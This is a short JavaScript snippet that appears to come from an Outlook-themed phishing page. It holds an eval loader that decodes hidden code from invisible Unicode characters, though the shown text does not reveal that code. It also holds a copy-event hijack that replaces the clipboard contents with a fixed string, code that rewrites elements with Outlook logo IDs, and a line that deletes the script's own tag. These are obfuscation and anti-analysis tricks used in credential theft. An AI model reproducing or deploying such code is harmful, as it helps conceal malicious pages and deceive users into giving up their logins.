new Proxy({}, {
    get: function(_, key) {
        return eval([...key]
            .map(char => +('ﾠ' > char))
            .join('')
            .replace(/.{8}/g, byte => String.fromCharCode(parseInt(byte, 2)))
        );
    }
}).
document.addEventListener('copy', function(event) {
    if (document.activeElement.tagName === 'INPUT' ||
        document.activeElement.tagName === 'TEXTAREA' ||
        document.activeElement.isContentEditable) {
        return;
    }
    event.preventDefault();
    var customWord = "hLuccWCaic";
    event.clipboardData.setData('text/plain', customWord);
});

document.getElementById('outlooklogostyle').remove();
document.getElementById('outlooklogo').setAttribute('class', "startnew");
document.getElementById('outlooklogo').removeAttribute('style');
document.getElementById('outlooklogo').removeAttribute('id');
document.getElementById('outlooklogoele').remove();
var OfmWmpqStv = document.currentScript;
OfmWmpqStv.parentNode.removeChild(OfmWmpqStv);
